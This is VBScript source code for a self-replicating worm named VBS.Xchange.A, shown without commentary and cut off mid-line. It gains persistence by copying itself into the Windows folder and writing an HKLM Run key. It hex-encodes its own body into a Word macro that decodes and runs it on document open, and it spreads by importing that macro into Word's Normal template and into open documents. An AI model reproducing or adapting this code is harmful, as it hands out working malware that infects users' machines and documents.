'VBS.Xchange.A
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
Set fl=fso.OpenTextFile(WScript.ScriptFullname,1)
virus=fl.ReadAll
fl.Close

Set win=fso.GetSpecialFolder(0)
fcopy=win&"\MSXchange.vbs"
reg="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
fso.GetFile(WScript.ScriptFullName).Copy(fcopy)
ws.RegWrite reg&"\MsExchange",fcopy

set sp=fso.CreateTextFile("C:\XChange.vba",True,8)
sp.WriteLine "Attribute VB_Name = ""Xchange"""
sp.WriteLine "Sub AutoOpen()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "e = """""

For i=1 To len(virus)

e=Mid(virus,i,1)
e=Hex(Asc(e))

If Len(e)=1 Then
e="0"&e
End If

f=f+e
If Len(f)=110 Then
sp.WriteLine "e = e + """+f+""""
f=""
End If

If Len(virus)-i = 0 Then
sp.WriteLine "e = e + """+f+""""
f=""
End If

Next

sp.WriteLine "read=dec(e)"
sp.WriteLine "Open ""C:\xchange.vbs"" For Output As #1"
sp.WriteLine "Print #1, read"
sp.WriteLine "Close #1"
sp.WriteLine "Shell ""wscript C:\xchange.vbs"""
sp.WriteLine "Call infect_fichier"
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Sub HelpAbout()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "MsgBox ""This is my very first VBS-W97M Worm"", vbInformation, ""I-Worm.Xchange"""
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Sub AutoClose()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "FileSystem.Kill ""C:\xchange.vbs"""
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Sub infect_fichier()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "Set nor = NormalTemplate.VBProject.VBComponents"
sp.WriteLine "Set doc = ActiveDocument.VBProject.VBComponents"
sp.WriteLine "df = ""C:\XChange.vba"""
sp.WriteLine "If nor.Item(""Xchange"").Name <> ""Xchange"" Then"
sp.WriteLine "   doc(""Xchange"").Export df"
sp.WriteLine "   nor.Import df"
sp.WriteLine "End If"
sp.WriteLine "If doc.Item(""Xchange"").Name <> ""Xchange"" Then"
sp.WriteLine "   nor(""Xchange"").Export df"
sp.WriteLine "   doc.Import df"
sp.WriteLine "   ActiveDocument.Save"
sp.WriteLin